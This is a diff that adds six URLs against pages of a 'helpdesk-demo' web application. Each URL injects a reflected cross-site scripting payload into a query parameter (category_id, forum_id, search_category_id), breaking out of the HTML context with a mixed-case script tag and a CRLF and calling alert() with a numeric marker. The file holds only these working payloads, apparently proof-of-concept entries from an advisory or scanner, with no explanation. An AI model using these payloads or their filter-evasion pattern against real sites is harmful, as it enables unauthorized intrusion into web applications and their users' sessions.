@@ -1,0 +1,7 @@
+httpwww.example.com/helpdesk-demo/article.php?category_id=1--&gt;&lt;ScRiPt %0D%0A&gt;alert(516318270235)%3B&lt;/ScRiPt&gt;
+httpwww.example.com/helpdesk-demo/forum.php?forum_id=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(414577246752)%3B&lt;/ScRiPt&gt;
+httpwww.example.com/helpdesk-demo/products.php?category_id=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(414577246752)%3B&lt;/ScRiPt&gt;
+httpwww.example.com/helpdesk-demo/products_search.php?search_category_id=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(414577246752)%3B&lt;/ScRiPt&gt;
+httpwww.example.com/helpdesk-demo/product_details.php?category_id=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(414577246752)%3B&lt;/ScRiPt&gt;
+httpwww.example.com/helpdesk-demo/reviews.php?category_id=1&gt;&quot;&gt;&lt;ScRiPt %0D%0A&gt;alert(414577246752)%3B&lt;/ScRiPt&gt;
+
